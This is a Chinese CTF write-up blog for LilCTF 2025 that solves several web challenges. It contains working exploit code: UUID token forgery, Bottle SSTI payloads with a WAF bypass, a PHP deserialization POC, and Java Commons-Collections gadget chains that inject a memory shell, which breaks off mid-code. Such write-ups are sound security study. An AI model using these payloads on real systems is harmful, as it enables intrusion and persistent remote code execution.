---
title: "lilctf 2025"
onlyTitle: true
date: 2025-8-28 13:45:14
categories:
- ctf
- WP
tags:
- CTF
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8169.jpg

---



## lilctf 2025

ctf地址（趁在线）https://lilctf.xinshi.fun/games/1/challenges

github：https://github.com/Lil-House/LilCTF-2025

不想打，只想复现，趁有环境来复现

### ekko_exec

找到出题人blog才算简单的题

本题最重要的hint是这个：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250820152020923.png)

#### uuid8的问题

有关uuid的blog：https://www.cnblogs.com/LAMENTXU/articles/18921150

博客中的PRNG和CSPRNG分别指的纯伪随机数生成器和密码学上安全的伪随机数生成器。一个不安全的伪随机，一个是安全的伪随机

简单概括说来，就是查看源码，uuid1生成逻辑中，时间戳、版本、MAC地址和两个14位的随机数值是变量。对于那两个14位的随机数，python出于性能考虑用的PRNG（代码为`random.getrandbits(14)`，使用的生成器为MT19937)可攻击，用pyrandcracker进行求解https://github.com/guoql666/pyrandcracker

```python
def uuid1(node=None, clock_seq=None):
```

因为每次获取时，MAC，版本都是一样的，暂时不用管

对于时间戳，LamentXU提出，先获取一个UUID，随后使受害主机生成目标UUID，之后再获取一个UUID。这样，目标UUID从时间维度上看就被我们已知的两个UUID夹在中间，然后爆破，有脚本https://github.com/Lupin-Holmes/sandwich

>因此对于python UUID1，我们的Attack flow大概是长这样的：
>
>- 获取1427个连续生成的UUID，求解MT19937矩阵。解出`clock_seq`对应的两个字段内容。
>- 从上述样本中任取其一获取固定不变的MAC地址（或随机node）获取node字段的值。
>- 分别获取目标UUID前后的两个UUID，实施SWATK攻击爆破位于中间的时间戳，求解time字段的值。

对于这道题来说，uuid1的知识并没有什么用

题目给出的Hint，是用于自己调试的，你自己去翻源代码，python3.14及以上才会读到uuid8的源码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250820153605400.png)

uuid8的源码中，参数有a,b,c三个参数

```python
def uuid8(a=None, b=None, c=None):
    """Generate a UUID from three custom blocks.

    * 'a' is the first 48-bit chunk of the UUID (octets 0-5);
    * 'b' is the mid 12-bit chunk (octets 6-7);
    * 'c' is the last 62-bit chunk (octets 8-15).

    When a value is not specified, a pseudo-random value is generated.
    """
    if a is None:
        import random
        a = random.getrandbits(48)
    if b is None:
        import random
        b = random.getrandbits(12)
    if c is None:
        import random
        c = random.getrandbits(62)
    int_uuid_8 = (a & 0xffff_ffff_ffff) << 80
    int_uuid_8 |= (b & 0xfff) << 64
    int_uuid_8 |= c & 0x3fff_ffff_ffff_ffff
    # by construction, the variant and version bits are already cleared
    int_uuid_8 |= _RFC_4122_VERSION_8_FLAGS
    return UUID._from_int(int_uuid_8)

```

假如服务器不输入任何参数，直接采用默认配置None（即，直接调用`uuid.uuid8()`）那么可以说，python中的UUIDv8是极不安全的。因为其每一个部分都采用了伪随机数(`random.getrandbits(xx)`)。很好破解的MT19937算法

#### 题解

回到题目，审计一下，execute_command路由可以执行命令，不过要check_time_api()返回true

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250820155406732.png)

check_time_api需要访问user的time_api，返回的年份需要大于2066

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250820155515798.png)

然后发现在/admin/settings可以修改time_api，不过注解admin_required要求is_admin为true

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250820155627883.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250820155741097.png)

逻辑也是很清楚了，我们需要修改用户满足is_admin true->/admin/settings修改time_api->exectute_command执行命令

在忘记密码路由，写了逻辑，但是没什么鸟用，不用这个路由

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250820160023783.png)

直接请求/reset_password去重置密码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250820161036492.png)

server_info可以拿到建站时，也就是token uuid8生成的时间戳

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250820161218364.png)

根据源码中的`str(uuid.uuid8(a=padding(user.username)))`，我们也要传入相同的参数

另外，根据pyrandcracker的用法，用random.seed能初始化随机数生成器到指定的时间状态，这样就能生成当时的uuid8

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250820172334843.png)

于是token用这个生成：

```python
import random
import uuid

def padding(username: str) -> int:
    b = username.encode('utf-8')
    b = (b[:6] if len(b) > 6 else b.ljust(6, b'\x00'))
    return int.from_bytes(b, 'big')

seed = 1755370834.1768594  # /server_info 拿到的浮点数
username = "admin"         

random.seed(seed)
a_val = padding(username)
print(f"padding: {a_val}")
print(str(uuid.uuid8(a=a_val)))
```

把生成的数据作为token在/reset_password使用去重置admin的密码即可登录

我这懒得装python 3.14了，就不复现了

登录后自己写个flask api去返回大于2066的时间，然后就能执行命令，已知目标为python3环境，所以可以用python的反弹shell

```Python
from flask import Flask, Response, jsonify
from datetime import datetime
app = Flask(__name__)

@app.get("/api/time")
def alltime():
    target_dt = datetime(2067, 7, 5, 19, 20, 29)

    return jsonify({
            "date": target_dt.strftime("%Y-%m-%d %H:%M:%S"),
            "weekday": "星期三", 

            "timestamp": int(target_dt.timestamp())
    })
app.run("0.0.0.0", 5000)
```



另外还有个非预期（怪不得解这么多）

题目给的SECRET_KEY本以为是个摆设，按理说发布前都得改的。没想到出题人这么实诚，key还真是这个，于是可以flask session伪造修改is_admin:1进行登录。。。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250820154928368.png)



### ez_bottle



#### 题解

给了一个upload路由，在view的子路由查看文件，可以看到有ssti

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250820173527717.png)

题解1：

阅读bottle的官方文档https://www.osgeo.cn/bottle/stpl.html

发现`% `能执行python代码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250820174135465.png)

直接subprocess.run写回显到static下即可，自己压缩zip

```python
% import subprocess;subprocess.run(['sh','-c','cat /flag | tee static/2.txt'])
```

```python
import requests

with open('1.zip', 'rb') as f:
    files = {'file': f}
    response = requests.post('http://challenge.xinshi.fun:39858/upload', files=files)
    print(response.text)
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250820180444574.png)

题解2：

文件上传并没有WAF，而是在渲染处才有WAF

那上传一个ssti文件，再上传一个include之前文件，include并不在黑名单

文件1：

```
{{__import__('os').popen('cat /flag').read()}}
```

文件2：

```
% include("uploads/xxxxxx/xxx.zip")
```





### 斜体字绕过bottle SSTI WAF

小插曲，XYCTF那次就简单的看了一下wp，有点斜体字绕过的印象，这次来记录

https://www.cnblogs.com/LAMENTXU/articles/18805019

转斜体网站https://exotictext.com/zh-cn/italic/

关于漏洞原因就不重复说了

目前只能替换`o`，`a`，在**bottle**的SSTI里，他们可以被直接替换成`ª` (U+00AA)，`º` (U+00BA)进而绕过各种waf

假如直接`exec()`任意code的话，python会把code中当作代码处理的斜体字根据`Decomposition`转成对应的ASCII字符。假如whoami或os为斜体，则会无法执行，因为找不到斜体的os库，和斜体的whoami命令

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora3392505-20250331225526421-284567666.png)

但是假设靶机提供了一种可以不使用URL编码的方式将可控输入传入template（如：上传文件，再渲染文件中的内容形成的SSTI）那就意味着所有的字符可以全部用各种斜体替换

文章给出了exp去替换poc中的o,a字符：

```python
import re

def replace_unquoted(text):
    pattern = r'(\'.*?\'|\".*?\")|([oa])'
    
    def replacement(match):
        if match.group(1):
            return match.group(1)
        else:
            char = match.group(2)
            replacements = {
                'o': '%ba',
                'a': '%aa',
            }
            return replacements.get(char, char)
    
    result = re.sub(pattern, replacement, text)
    return result

input_text = '' # payload
output_text = replace_unquoted(input_text)
print("处理后的字符串:", output_text)
```



### Your Uns3r

很好的题，全场最佳

```php
<?php
highlight_file(__FILE__);
class User
{
    public $username;
    public $value;
    public function exec()
    {
        $ser = unserialize(serialize(unserialize($this->value)));
        if ($ser != $this->value && $ser instanceof Access) {
            include($ser->getToken());
        }
    }
    public function __destruct()
    {
        if ($this->username == "admin") {
            $this->exec();
        }
    }
}

class Access
{
    protected $prefix;
    protected $suffix;

    public function getToken()
    {
        if (!is_string($this->prefix) || !is_string($this->suffix)) {
            throw new Exception("Go to HELL!");
        }
        $result = $this->prefix . 'lilctf' . $this->suffix;
        if (strpos($result, 'pearcmd') !== false) {
            throw new Exception("Can I have peachcmd?");
        }
        return $result;

    }
}

$ser = $_POST["user"];
if (strpos($ser, 'admin') !== false && strpos($ser, 'Access":') !== false) {
    exit ("no way!!!!");
}

$user = unserialize($ser);
throw new Exception("nonono!!!");
```

`__destruct()`在对象没有被手动覆盖、销毁的情况下，会在脚本结束时执行。但是由于最后的throw异常，不能顺利执行到

另外注意到

```php
$ser = unserialize(serialize(unserialize($this->value)));
$ser instanceof Access
```

https://www.wangan.com/p/7fy7f46cd2c8727f#fastdestruct%E6%8F%90%E5%89%8D%E8%A7%A6%E5%8F%91%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95

#### 知识点1:`__PHP_Incomplete_Class`

在PHP中，当我们在反序列化一个不存在的类时，会发生什么呢

PHP在遇到不存在的类时，会把不存在的类转换成`__PHP_Incomplete_Class`这种特殊的类，同时将原始的类名A存放在`__PHP_Incomplete_Class_Name`这个属性中，其余属性存放方式不变。

如果一个序列化字符串开始具有`__PHP_Incomplete_Class_Name`属性，则反序列化后就是指定的类，即使不存在这个类的声明。再经过一次序列化后便不存在该属性了，导致了`serialize(unserialize($x)) != $x`的出现

其他内容看上述文章

所以看到serialize(unserialize(xxx))时，大概率是这个知识点

#### 知识点2：Fast Destruct

fast destruct 是因为unserialize过程中扫描器发现序列化字符串格式有误导致的提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的`__destruct()`,提前触发反序列化链条。

PHP5 (PHP7 以上才会调用) 在抛出异常后不会调用 `__destruct` 销毁对象，所以该题目dustruct的调用被结尾的throw打断了，但是我们用异常的反序列化就能提前调用destruct

通常把序列化字符串结尾的`}`去掉就能触发异常，或者修改其中的属性个数



#### 题解

至于链子就是反序列化User->destruct->Access#exec->include

文件包含有个脏数据lilctf，用../绕过

`$this->username == "admin"`弱比较，赋值为true绕过，注意是&，不用绕过`Access":`



poc:

```php
<?php
class User
{
    public $username;
    public $value;
}

class Access
{
    protected $prefix;
    protected $suffix;
    
    public function __construct($prefix, $suffix)
    {
    	$this->prefix = $prefix;
    	$this->suffix = $suffix;
    }
}

$access = new Access("/", "/../flag");

$user = new User();
$user->username = true;
$user->value = serialize($access);

$ser = serialize($user);
echo $ser;
echo urlencode($ser);

#user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bb%3A1%3Bs%3A5%3A%22value%22%3Bs%3A72%3A%22O%3A6%3A%22Access%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A1%3A%22%2F%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A8%3A%22%2F..%2Fflag%22%3B%7D%22%3B
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250821173246633.png)



### blade_cc

就是冲这个来的

我的CC链子图

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20240802170805620.png)

题目黑名单

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250821183738147.png)

#### 链子的绕过

省流：LazyList.get()->TransformedList.set()->transform能替代LazyMap.get->transformer的作用

CodeSigner.toString->get()

至于调用到toString的方法就很多了

BadAttributeValueExpException.readObject -> toString

XString.equals -> toString

HashMap.readObject() -> AbstractMap.equals -> UIDefault$TextAndMnemonicHashMap.get -> toString

EventListenerList.readObject() -> tostring

这里唯一能用的是EventListenerList.readObject() -> tostring

另外，题目虽然没ban InvokerTransformer，但是ban了chainedTransformer和TemplatesImpl，题目又不出网，很明显要打内存马，没有字节码怎么打内存马？

唯一的办法就是想办法用InvokerTransformer打二次反序列化绕过WAF限制，去执行字节码，但是这里signedObject被ban了。

用rmi的方式进行二次反序列化，在8u231之前都能用无Bypass版的JRMP进行二次反序列化

https://xz.aliyun.com/news/14968

https://godownio.github.io/2024/09/20/rmi-san-duan-jrmp-ji-qi-gao-ban-ben-rao-guo/#DGC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250821183431422.png)

这里不知道目标的jdk版本，直接用无版本限制的RMIConnector进行二次反序列化

#### 不出网回显

可以打内存马，也可以打个回显就行了

下面是解决不出网的问题，题目用了blade框架和netty中间件

众所周知内存马的注入得先找到一个上下文Context

看到com.hellokaton.blade.mvc.WebContext

首先得调试jar包，https://www.cnblogs.com/Chary/p/18699415

文中有一件事没说，就是得把jar解压的文件夹添加进项目库，不然找不到模块

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827102016970.png)

然后WebContext就能断住

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827102055310.png)

调试变量里request和response都是对应http请求，那很明显这就是我们要找的Context了

用java-object-searcher找WebContext在线程中的栈帧位置，放到jre/lib/ext后在SDK库里面加一下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827110450191.png)

也是很EZ的找到了Blade和netty的回显Context栈帧

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827110604990.png)

反射逐步取出，写response回显就行



另外的，有文章给出写内存马进行持久化，写内存马就很明显要注册一个自定义的组件，比如Tomcat中的Exector、Filter、Listener等组件，这里模拟一下Filter内存马的思路，找一下请求分发的位置

根据栈中到达WebContext的位置，找到了HttpServerHandler类![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827135026770.png)

HttpServerHandler#executeLogic先是从routeMatcher匹配了路由，然后把请求上下文交给了routeHandler去handle处理

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827134843322.png)

跟进到handle，把请求上下文交给具体的路由方法去处理（看到invokeHook就知道是把请求交给路由了，其他中间件也是，直接反射调用对应路由方法）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827135258349.png)

跟进也是很明显，反射调用路由方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827135442985.png)

所以我们只需要向HttpServerHandler中注入路由匹配的routeMatcher和自定义的恶意routeHandler就行了

netty内存马还没学，可以找个netty内存马去打，这里就不班门弄斧了



#### 题解

新的CC链子：

```java
EventListenerList.readObject() -> tostring
    CodeSigner.toString->get()
    LazyList.get()->TransformedList.set()->transform
    (ChainedTransformer.transform)
    InvokerTransformer.transform() RCE
```

先弹个计算器，滚去我的POC库吧

由于CertPath重写了writeReplace导致序列化异常，作者使用了agent将其hook掉。我编译了一个放在了https://github.com/godownio/java_unserial_attackcode/blob/master/lib/CCnewAgent.jar

```java
package org.exploit.CC;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.list.LazyList;
import org.apache.commons.collections.list.TransformedList;
import sun.security.provider.certpath.X509CertPath;

import javax.swing.event.EventListenerList;
import javax.swing.undo.CompoundEdit;
import javax.swing.undo.UndoManager;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.security.CodeSigner;
import java.security.cert.X509Certificate;
import java.util.*;

//3.2.1新链
public class CC321new {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        ArrayList<Object> arrayList = new ArrayList<>();
        arrayList.add(null);
        TransformedList transformedList = (TransformedList) TransformedList.decorate(arrayList, chainedTransformer);
        LazyList lazyList = (LazyList) LazyList.decorate(transformedList, ConstantFactory.getInstance("godown"));

        List<X509Certificate> certificates = new ArrayList<>();
// 创建X509CertPath实例
        X509CertPath x509CertPath = new X509CertPath(certificates);
        Field certs = X509CertPath.class.getDeclaredField("certs");
        certs.setAccessible(true);
        certs.set(x509CertPath,lazyList);
        CodeSigner codeSigner = new CodeSigner(x509CertPath, null);

        EventListenerList eventListenerList = new EventListenerList();
        Field listenerList = EventListenerList.class.getDeclaredField("listenerList");
        listenerList.setAccessible(true);
        Vector vector = new Vector();
        vector.add(codeSigner);
        UndoManager undoManager = new UndoManager();
        Field edit = CompoundEdit.class.getDeclaredField("edits");
        edit.setAccessible(true);
        edit.set(undoManager,vector);

        listenerList.set(eventListenerList,new Object[]{HashMap.class,undoManager});
        serialize(eventListenerList);
        unserialize("cc6.ser");
    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```

虚拟机选项`-javaagent:C:\Users\19583\IdeaProjects\java_unserial_attackcode\lib\CCnewAgent.jar`，premain的agent

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827173355875.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827173343025.png)



下面改成触发RMIConnector#connect，去掉ChainedTransformer触发二次反序列化，二次反序列化用的CC3触发TemplatesImpl

```java

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.list.LazyList;
import org.apache.commons.collections.list.TransformedList;
import org.apache.commons.collections.map.LazyMap;
import sun.security.provider.certpath.X509CertPath;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import javax.swing.event.EventListenerList;
import javax.swing.undo.CompoundEdit;
import javax.swing.undo.UndoManager;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.CodeSigner;
import java.security.cert.X509Certificate;
import java.util.*;

//3.2.1新链
public class test {
    public static void main(String[] args) throws Exception {
        String exp= getCC6();
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        Field urlPath = JMXServiceURL.class.getDeclaredField("urlPath");
        urlPath.setAccessible(true);
        urlPath.set(jmxServiceURL, "/stub/"+ exp);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);

        ArrayList<Object> arrayList = new ArrayList<>();
        arrayList.add(null);
        TransformedList transformedList = (TransformedList) TransformedList.decorate(arrayList, invokerTransformer);
        LazyList lazyList = (LazyList) LazyList.decorate(transformedList, ConstantFactory.getInstance(rmiConnector));

        List<X509Certificate> certificates = new ArrayList<>();
// 创建X509CertPath实例
        X509CertPath x509CertPath = new X509CertPath(certificates);
        Field certs = X509CertPath.class.getDeclaredField("certs");
        certs.setAccessible(true);
        certs.set(x509CertPath,lazyList);
        CodeSigner codeSigner = new CodeSigner(x509CertPath, null);

        EventListenerList eventListenerList = new EventListenerList();
        Field listenerList = EventListenerList.class.getDeclaredField("listenerList");
        listenerList.setAccessible(true);
        Vector vector = new Vector();
        vector.add(codeSigner);
        UndoManager undoManager = new UndoManager();
        Field edit = CompoundEdit.class.getDeclaredField("edits");
        edit.setAccessible(true);
        edit.set(undoManager,vector);

        listenerList.set(eventListenerList,new Object[]{HashMap.class,undoManager});
        serialize(eventListenerList);
        unserialize("cc6.ser");
    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
    public static String getCC6() throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templatesClass),
                new InvokerTransformer("newTransformer",new Class[]{},new Object[]{}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer("godown"));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test1");
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry, "test2");
        map.remove("test1");
        Class lazymapClass = lazyMap.getClass();
        Field factory = lazymapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(factory, factory.getModifiers() & ~Modifier.FINAL);
        factory.set(lazyMap, chainedTransformer);
        return serializeToBase64(hashMap);
//        unserialize("cc6.ser");
    }
    public static String serializeToBase64(Object obj) throws IOException {
        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(obj);
            return Base64.getEncoder().encodeToString(baos.toByteArray());
        }
    }
}

```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoratyporaimage-20250827175111030.png)

然后根据这个栈帧取Context

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827175827941.png)

试了下直接写到里面的response

额我草，CC3自带报错，blade中有报错会直接覆盖原输出，我草

目前看来要不打无报错CC回显，要么还是得持久化，用另一个路由回显

用到了TemplatesImpl字节码的就会报错，因为反序列化中间有类型转换问题，我草，还是只能注册路由了

POC：

CCnew打RMIConnector二次反序列化->CC3注入内存马

```java

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.list.LazyList;
import org.apache.commons.collections.list.TransformedList;
import org.apache.commons.collections.map.LazyMap;
import sun.security.provider.certpath.X509CertPath;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import javax.swing.event.EventListenerList;
import javax.swing.undo.CompoundEdit;
import javax.swing.undo.UndoManager;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.CodeSigner;
import java.security.cert.X509Certificate;
import java.util.*;

//3.2.1新链
public class CTFCCnew {
    public static void main(String[] args) throws Exception {
        String exp= getCC6();
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        Field urlPath = JMXServiceURL.class.getDeclaredField("urlPath");
        urlPath.setAccessible(true);
        urlPath.set(jmxServiceURL, "/stub/"+ exp);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);

        ArrayList<Object> arrayList = new ArrayList<>();
        arrayList.add(null);
        TransformedList transformedList = (TransformedList) TransformedList.decorate(arrayList, invokerTransformer);
        LazyList lazyList = (LazyList) LazyList.decorate(transformedList, ConstantFactory.getInstance(rmiConnector));

        List<X509Certificate> certificates = new ArrayList<>();
// 创建X509CertPath实例
        X509CertPath x509CertPath = new X509CertPath(certificates);
        Field certs = X509CertPath.class.getDeclaredField("certs");
        certs.setAccessible(true);
        certs.set(x509CertPath,lazyList);
        CodeSigner codeSigner = new CodeSigner(x509CertPath, null);

        EventListenerList eventListenerList = new EventListenerList();
        Field listenerList = EventListenerList.class.getDeclaredField("listenerList");
        listenerList.setAccessible(true);
        Vector vector = new Vector();
        vector.add(codeSigner);
        UndoManager undoManager = new UndoManager();
        Field edit = CompoundEdit.class.getDeclaredField("edits");
        edit.setAccessible(true);
        edit.set(undoManager,vector);

        listenerList.set(eventListenerList,new Object[]{HashMap.class,undoManager});
        serialize(eventListenerList);
//        unserialize("cc6.ser");
    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
    public static String getCC6() throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/CTFMemShell.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templatesClass),
                new InvokerTransformer("newTransformer",new Class[]{},new Object[]{}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer("godown"));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test1");
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry, "test2");
        map.remove("test1");
        Class lazymapClass = lazyMap.getClass();
        Field factory = lazymapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(factory, factory.getModifiers() & ~Modifier.FINAL);
        factory.set(lazyMap, chainedTransformer);
        serialize(hashMap);
        return serializeToBase64(hashMap);
//        unserialize("cc6.ser");
    }
    public static String serializeToBase64(Object obj) throws IOException {
        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(obj);
            return Base64.getEncoder().encodeToString(baos.toByteArray());
        }
    }
}

```

内存马

```java

import com.hellokaton.blade.mvc.WebContext;
import com.hellokaton.blade.mvc.http.HttpMethod;
import com.hellokaton.blade.mvc.http.HttpResponse;
import com.hellokaton.blade.mvc.http.Request;
import com.hellokaton.blade.mvc.route.Route;
import com.hellokaton.blade.mvc.route.RouteMatcher;
import com.hellokaton.blade.mvc.route.mapping.StaticMapping;
import com.hellokaton.blade.server.HttpServerHandler;
import com.hellokaton.blade.server.RouteMethodHandler;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.util.internal.InternalThreadLocalMap;
import org.springframework.web.bind.annotation.RequestParam;
import sun.misc.Unsafe;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import com.hellokaton.blade.annotation.Path;

import java.lang.reflect.Method;
import java.util.Scanner;

public class CTFMemShell extends AbstractTranslet {
    static {
        try {
            Class<?> name = Class.forName("sun.misc.Unsafe");
            Field theUnsafe = name.getDeclaredField("theUnsafe");
            theUnsafe.setAccessible(true);
            Unsafe unsafe = (Unsafe) theUnsafe.get(null);
            Thread thread = Thread.currentThread();
            ThreadLocal<Object> objectThreadLocal = new ThreadLocal<>();
            Method getMap = ThreadLocal.class.getDeclaredMethod("getMap",Thread.class);
            getMap.setAccessible(true);
            Object threadLocals = getMap.invoke(objectThreadLocal, thread);
            Class<?> threadLocalMap = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
            Field tablesFiled = threadLocalMap.getDeclaredField("table");
            tablesFiled.setAccessible(true);
            Object table = tablesFiled.get(threadLocals);
            Object o = null;
